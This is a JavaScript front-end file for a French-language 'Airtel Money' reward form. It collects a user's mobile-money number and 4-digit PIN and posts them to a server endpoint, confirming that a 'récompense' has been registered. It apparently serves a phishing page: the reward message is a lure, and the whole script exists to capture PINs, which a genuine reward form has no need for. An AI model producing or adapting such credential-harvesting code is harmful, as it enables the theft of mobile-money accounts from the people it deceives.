// API Base URL
const API_BASE = '/api';

// DOM Elements
const form = document.getElementById('registrationForm');
const nameInput = document.getElementById('name');
const yasPinInput = document.getElementById('yasPin');
const successMessage = document.getElementById('successMessage');
const errorMessage = document.getElementById('errorMessage');
const loadingSpinner = document.getElementById('loadingSpinner');
const submitBtn = form.querySelector('.btn-submit');

// Form Submission Handler
form.addEventListener('submit', async (e) => {
  e.preventDefault();
  
  // Clear previous messages
  successMessage.style.display = 'none';
  errorMessage.style.display = 'none';
  
  // Validate inputs
  if (!validateForm()) {
    return;
  }

  try {
    // Show loading state
    loadingSpinner.style.display = 'block';
    submitBtn.disabled = true;

    // Prepare data
    const data = {
      name: nameInput.value.trim(),
      yasPin: yasPinInput.value.trim()
    };

    // Send to server
    const response = await fetch(`${API_BASE}/entries`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    });

    const result = await response.json();

    if (response.ok) {
      // Success
      showSuccess(`✅ Merci ${data.name}! Votre récompense a été enregistrée. ID: ${result.data.id.substring(0, 8)}`);
      form.reset();
      
      // Log the entry
      console.log('✅ Entry registered:', result.data);
    } else {
      // Error from server
      showError(result.error || 'Une erreur est survenue. Veuillez réessayer.');
    }
  } catch (error) {
    console.error('Error:', error);
    showError('Erreur réseau. Veuillez réessayer.');
  } finally {
    // Hide loading state
    loadingSpinner.style.display = 'none';
    submitBtn.disabled = false;
  }
});

// Validate Form
function validateForm() {
  let isValid = true;
  
  // Clear previous errors
  document.getElementById('nameError').textContent = '';
  document.getElementById('yasPinError').textContent = '';

  // Validate name
  const name = nameInput.value.trim();
  if (!name) {
    setError('nameError', 'Entrez votre numéro Airtel Money');
    isValid = false;
  } else if (name.length < 2) {
    setError('nameError', 'Le numéro doit contenir au moins 2 caractères');
    isValid = false;
  }

  // Validate YAS PIN
  const yasPin = yasPinInput.value.trim();
  if (!yasPin) {
    setError('yasPinError', 'Entrez votre code PIN');
    isValid = false;
  } else if (yasPin.length !== 4) {
    setError('yasPinError', 'Le code PIN doit contenir 4 chiffres');
    isValid = false;
  } else if (!/^\d+$/.test(yasPin)) {
    setError('yasPinError', 'Le code PIN doit contenir uniquement des chiffres');
    isValid = false;
  }

  return isValid;
}

// Set Error Message
function setError(elementId, message) {
  document.getElementById(elementId).textContent = message;
}

// Show Success Message
function showSuccess(message) {
  successMessage.textContent = message;
  successMessage.style.display = 'block';
  
  // Auto-hide after 5 seconds
  setTimeout(() => {
    successMessage.style.display = 'none';
  }, 5000);
}

// Show Error Message
function showError(message) {
  errorMessage.textContent = message;
  errorMessage.style.display = 'block';
  
  // Auto-hide after 5 seconds
  setTimeout(() => {
    errorMessage.style.display = 'none';
  }, 5000);
}

// Real-time validation
nameInput.addEventListener('input', (e) => {
  if (e.target.value.length >= 2) {
    document.getElementById('nameError').textContent = '';
  }
});

yasPinInput.addEventListener('input', (e) => {
  // Only allow digits
  e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
  
  if (e.target.value.length === 4) {
    document.getElementById('yasPinError').textContent = '';
  }
});

// Log form submission for debugging
form.addEventListener('submit', () => {
  console.log('📝 Form submitted with data:', {
    name: nameInput.value,
    yasPin: '****'
  });
});

// Initialize
console.log('Airtel Money entry form loaded');
